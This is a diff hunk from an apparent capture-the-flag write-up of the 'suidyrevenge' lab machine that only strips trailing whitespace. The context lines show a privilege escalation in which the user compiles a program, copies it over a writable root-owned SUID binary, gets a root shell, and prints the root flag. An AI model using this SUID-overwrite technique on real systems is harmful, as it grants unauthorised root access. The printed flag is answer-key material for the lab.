@@ -299,13 +299,13 @@ int main(){
 ```shell
 (remote) theuser@suidyrevenge:/home/theuser$ nano suid.c
 (remote) theuser@suidyrevenge:/home/theuser$ gcc suid.c -o suid
-(remote) theuser@suidyrevenge:/home/theuser$ cp ./suid /home/suidy/suidyyyyy 
+(remote) theuser@suidyrevenge:/home/theuser$ cp ./suid /home/suidy/suidyyyyy
 (remote) theuser@suidyrevenge:/home/theuser$ cd /home/suidy/
 (remote) theuser@suidyrevenge:/home/suidy$ ls -lh
 total 24K
 -rw-r----- 1 suidy suidy   262 Oct  1  2020 note.txt
 -rwsrws--- 1 root  theuser 17K Feb 16 02:10 suidyyyyy
-(remote) theuser@suidyrevenge:/home/suidy$ ./suidyyyyy 
+(remote) theuser@suidyrevenge:/home/suidy$ ./suidyyyyy
 root@suidyrevenge:/home/suidy# whoami
 root
 ```
@@ -315,29 +315,29 @@ root
 ### flag- root
 
 ```shell
-root@suidyrevenge:/root# cat root.txt 
-                                                                                
-                                   .     **                                     
-                                *           *.                                  
-                                              ,*                                
-                                                 *,                             
-                         ,                         ,*                           
-                      .,                              *,                        
-                    /                                    *                      
-                 ,*                                        *,                   
-               /.                                            .*.                
-             *                                                  **              
-             ,*                                               ,*                
-                **                                          *.                  
-                   **                                    **.                    
-                     ,*                                **                       
-                        *,                          ,*                          
-                           *                      **                            
-                             *,                .*                               
-                                *.           **                                 
-                                  **      ,*,                                   
-                                     ** *,                                      
-                                                                                
-                                                                                
-HMVvoilarootlala  
+root@suidyrevenge:/root# cat root.txt
+
+                                   .     **
+                                *           *.
+                                              ,*
+                                                 *,
+                         ,                         ,*
+                      .,                              *,
+                    /                                    *
+                 ,*                                        *,
+               /.                                            .*.
+             *                                                  **
+             ,*                                               ,*
+                **                                          *.
+                   **                                    **.
+                     ,*                                **
+                        *,                          ,*
+                           *                      **
+                             *,                .*
+                                *.           **
+                                  **      ,*,
+                                     ** *,
+
+
+HMVvoilarootlala
 ```
